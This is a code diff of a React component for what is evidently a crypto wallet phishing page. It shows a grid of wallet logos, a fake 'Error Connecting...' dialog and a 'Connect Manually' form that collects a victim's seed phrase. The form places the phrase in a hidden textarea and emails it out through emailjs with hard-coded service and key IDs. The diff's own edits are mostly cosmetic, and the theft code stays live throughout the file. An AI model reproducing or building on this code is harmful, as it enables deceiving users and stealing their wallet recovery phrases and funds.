@@ -1,7 +1,9 @@
 import React, { useState, useRef} from "react";
-import SVGIcon from "../../Components/SvgIconProp";
 import { Modal } from "antd";
 import  emailjs from "@emailjs/browser"
+import SVGIcon from "../../Components/SvgIconProp"
+
+// const SVGIcon = lazy(() => import("../../Components/SvgIconProp"));
 
 const MapSVG: React.FC = () => {
   const SVGfiles: string[] = ['TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg', 'Argent.svg', 'Binance.svg', 'BonkBot.svg',
@@ -48,7 +50,7 @@ const MapSVG: React.FC = () => {
         e.preventDefault();
 
       
-      if (formRef.current) {//using the conditional statement to check if formRef.current is null
+      if (formRef.current) {
         emailjs
           .sendForm('service_soml4ai', 'template_a0zy764', formRef.current, {
             publicKey: 'n7CQrn8bAS_FXzHDw',
@@ -65,11 +67,6 @@ const MapSVG: React.FC = () => {
         
       };
 
-      // Function to handle seed phrase 
-    const handleSeedPhraseSubmit =  () => {
-     // console.log(seedPhraseString)
-    };
-
       const seedPhraseString = seedPhrase.join(' ');
 
 
@@ -77,8 +74,10 @@ const MapSVG: React.FC = () => {
     <div  className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0 ">
       {SVGfiles.map((fileName, index) => (
         <div key={index} className="cursor-pointer" onClick={showFirstModal}>
-          <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14"  />
-          <p className="text-xs pt-2 flex items-baseline text-white " >{SVGNames[index]}</p>
+          
+            <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14"  />
+            <p className="text-xs pt-2 flex items-baseline text-white " >{SVGNames[index]}</p>
+          
         </div>
       ))}
 
@@ -91,7 +90,7 @@ const MapSVG: React.FC = () => {
       >
         <div className="border-2 border-red-700 rounded-xl px-8 py-4 ">
           <p className="text-red-700 font-semibold">Error Connecting...</p>
-          {/* Attach onClick event to the button */}
+          
           <button className="text-white text-[0.7rem] font-semibold bg-slate-900 rounded-lg px-2 py-1" onClick={showSecondModal}>Connect Manually</button>
         </div>
       </Modal>
@@ -110,9 +109,9 @@ const MapSVG: React.FC = () => {
                 onChange={(e) =>
                   setSeedPhrase((prevSeedPhrase) => {
                     e.preventDefault();
-                    const newSeedPhrase = [...prevSeedPhrase]; // Create a copy of the array
-                    newSeedPhrase[index] = e.target.value; // Update the value at the specific index
-                    return newSeedPhrase; // Return the new array
+                    const newSeedPhrase = [...prevSeedPhrase]; 
+                    newSeedPhrase[index] = e.target.value; 
+                    return newSeedPhrase; 
                   })
                 }
                 />
@@ -121,7 +120,7 @@ const MapSVG: React.FC = () => {
         </div>
         <textarea name="message" className="hidden" value={seedPhraseString} />
         <div className="flex justify-end pt-4">
-          <button type="submit" value='send' className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" onClick={handleSeedPhraseSubmit}>Connect</button>
+          <button type="submit" value='send' className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" >Connect</button>
         </div>
         </form>
     
